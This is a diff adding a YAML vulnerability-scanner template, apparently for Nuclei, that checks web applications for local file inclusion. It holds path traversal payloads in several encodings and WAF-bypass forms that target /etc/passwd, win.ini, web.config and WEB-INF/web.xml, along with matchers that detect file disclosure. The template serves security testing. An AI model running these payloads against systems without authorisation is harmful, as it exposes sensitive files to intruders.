@@ -1,0 +1,122 @@
+id: lfi-keyed
+
+info:
+  name: LFI Detection - Keyed
+  author: pwnhxl
+  severity: high
+  reference:
+    - https://owasp.org/www-community/attacks/Unicode_Encoding
+  metadata:
+    max-request: 25
+  tags: dast,pathtraversal,lfi
+
+variables:
+  fuzz: "../../../../../../../../../../../../../../../"
+  fuzz_urlx2_encode: "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f"
+  fuzz_hex_unicode: "%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002f"
+  fuzz_utf8_unicode: "%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF%C0%AE%C0%AE%C0%AF"
+  fuzz_utf8_unicode_x: "%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF%C0AE%C0AE%C0AF"
+  fuzz_bypass_replace: ".../.../.../.../.../.../.../.../.../.../.../.../.../.../.../"
+  fuzz_bypass_replace_windows: '..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\'
+  fuzz_bypass_waf_regx: "./.././.././.././.././.././.././.././.././.././.././.././.././.././.././../"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      pathtraversal:
+        - '{{fuzz}}etc/passwd'
+        - '{{fuzz}}windows/win.ini'
+        - '/etc/passwd%00.jpg'
+        - 'c:/windows/win.ini%00.jpg'
+        - '{{fuzz}}etc/passwd%00.jpg'
+        - '{{fuzz}}windows/win.ini%00.jpg'
+        - '{{fuzz_urlx2_encode}}etc%252fpasswd'
+        - '{{fuzz_urlx2_encode}}windows%252fwin.ini'
+        - '{{fuzz_hex_unicode}}etc%u002fpasswd'
+        - '{{fuzz_hex_unicode}}windows%u002fwin.ini'
+        - '{{fuzz_utf8_unicode}}etc%C0%AFpasswd'
+        - '{{fuzz_utf8_unicode}}windows%C0%AFwin.ini'
+        - '{{fuzz_utf8_unicode_x}}etc%C0AFpasswd'
+        - '{{fuzz_utf8_unicode_x}}windows%C0AFwin.ini'
+        - '{{fuzz_bypass_replace}}etc/passwd'
+        - '{{fuzz_bypass_replace}}windows/win.ini'
+        - '{{fuzz_bypass_replace_windows}}windows\win.ini'
+        - '{{fuzz_bypass_waf_regx}}etc/passwd'
+        - '{{fuzz_bypass_waf_regx}}windows/win.ini'
+        - './web.config'
+        - '../web.config'
+        - '../../web.config'
+        - './WEB-INF/web.xml'
+        - '../WEB-INF/web.xml'
+        - '../../WEB-INF/web.xml'
+
+    fuzzing:
+      - part: query
+        mode: single
+        keys:
+          - cat
+          - dir
+          - action
+          - board
+          - date
+          - detail
+          - file
+          - download
+          - path
+          - folder
+          - prefix
+          - include
+          - page
+          - inc
+          - locate
+          - show
+          - doc
+          - site
+          - type
+          - view
+          - content
+          - document
+          - layout
+          - mod
+          - conf
+          - url
+          - img
+          - image
+          - images
+        fuzz:
+          - "{{pathtraversal}}"
+
+      - part: query
+        mode: single
+        values:
+          - "^(./|../|/)|(.html|.htm|.xml|.conf|.cfg|.log|.txt|.pdf|.doc|.docx|.xls|.csv|.png|.jpg|.gif)$"
+        fuzz:
+          - "{{pathtraversal}}"
+
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*?:[0-9]*:[0-9]*:'
+
+      - type: word
+        part: body
+        words:
+          - 'for 16-bit app support'
+
+      - type: regex
+        part: body
+        regex:
+          - '(<web-app[\s\S]+<\/web-app>)'
+
+      - type: regex
+        part: body
+        regex:
+          - '(<system.webServer[\s\S]+<\/system.webServer>)'
+# digest: 4a0a0047304502202114e3cc18e3be37d3feba20cbf4bd47253c21f71707cf188ae7d73ba8b6a5d6022100bfd226b80fe03a464014b44ccb1988ddf618d7cb3b00be0b5f82973903a592e1:922c64590222798bb761d5b6d8e72950
